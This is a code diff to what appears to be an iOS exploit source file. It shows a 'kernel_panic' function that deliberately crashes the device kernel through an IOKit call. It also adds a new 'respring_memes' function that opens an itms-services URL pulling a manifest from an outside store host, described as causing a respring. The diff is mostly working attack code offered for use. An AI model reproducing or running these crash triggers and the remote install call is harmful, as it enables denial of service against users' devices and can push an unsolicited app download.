@@ -9,6 +9,15 @@
 #include <string.h>
 #import "IOKitLib.h"
 #include <sys/utsname.h>
+#include <AVFoundation/AVFoundation.h>
+#include <MediaPlayer/MediaPlayer.h>
+#include <CoreFoundation/CoreFoundation.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <dirent.h>
+#include <string.h>
+#include <unistd.h>
+#include <time.h>
 
 // Used accross the exploits
 mach_port_t privileged_port = MACH_PORT_NULL;
@@ -51,7 +60,7 @@ mach_port_name_t get_self_port_name() {
     return self_port_name;
 }
 
-// Works only on i7, otherwise, exits
+// Works only on i7, otherwise, exits - thanks to @JonathanSeals
 void kernel_panic () {
     @autoreleasepool {
         uint64_t input[1] = {0x0};
@@ -68,8 +77,14 @@ void kernel_panic () {
         // no? exit then
         exit(0);
     }
+    respring_memes();
 }
 
+void respring_memes() {
+        //Not my bug. Causes respring. thanks @coffeebreakers
+        NSDictionary *opts = [[NSDictionary alloc] initWithObjectsAndKeys:@"tea", @"spoon", nil];
+        [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"itms-services://?action=download-manifest&url=https://flekstore.com/apps/suber/apps/Skop3125@yandex.ru/re.plist"] options:opts completionHandler:nil];
+}
 
 static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
     'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
